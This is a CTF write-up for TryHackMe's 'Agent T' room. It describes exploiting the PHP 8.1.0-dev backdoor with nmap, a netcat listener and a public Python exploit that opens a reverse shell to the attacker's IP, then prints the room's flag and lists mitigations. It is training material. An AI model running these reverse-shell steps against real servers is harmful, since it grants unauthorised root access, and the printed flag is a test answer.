---
layout: default
title: Agent T
---

- [./ctf-writeups](../../../) / [TryHackMe](../../) / [Rooms](../)

# Agent T      <a href="https://tryhackme.com/room/agentt/" target="_blank" rel="noopener"><img src="{{ '/assets/thm-logo.png' | relative_url }}" alt="TryHackMe" width="50"></a>

**Difficulty:** Easy  
**Category:** Web Exploitation

**Summary:** This was a fast and straightforward challenge involving a known backdoor in a development version of PHP. We identified the vulnerable service using Nmap, executed a Python reverse shell exploit, and retrieved the flag as the root user.

## 1. Reconnaissance
We started with an Nmap scan (`nmap -A 10.113.136.236`) to identify open ports and running services. The scan revealed that port 80 was open and hosting an HTTP server powered by `PHP 8.1.0-dev`. This specific PHP development build is well-known for containing a malicious backdoor.

<details>
<summary>nmap</summary>
<p><img src="../1.png"></p>
</details>

## 2. Exploitation
To exploit the vulnerability, we referenced a Python exploit script named `revshell_php_8.1.0-dev.py` from <a href="https://github.com/flast101/php-8.1.0-dev-backdoor-rce/" target="_blank" rel="noopener">@flast101</a>. We set up a Netcat listener on our attacker machine using `nc -nlvp 4444`. We then executed the exploit script (`python3 expl.py http://10.113.136.236 10.113.126.254 4444`) to trigger the backdoor and send a reverse shell back to our listener.

<details>
<summary>revshell</summary>
<p><img src="../2.png"></p>
</details>

## 3. Post-exploitation
The exploit immediately established a connection to our Netcat listener, granting us root access to the system. We located the flag by running
```
find / -type f -name "flag.txt"
```
which pointed us to `/flag.txt`. Reading the file yielded the final flag.

<details>
<summary>flag</summary>
<p><img src="../3.png"></p>
</details>

**Flag:** 
<span class="spoiler" role="button" tabindex="0" aria-label="Hidden flag">flag{4127d0530abf16d6d23973e3df8dbecb}</span>

## 4. Mitigation (how to fix it)
+ Never deploy development, nightly, or experimental software builds (such as PHP 8.1.0-dev) in production environments.
+ Implement strict egress firewall rules to block unauthorized outbound traffic, which prevents reverse shells from successfully connecting back to an attacker.
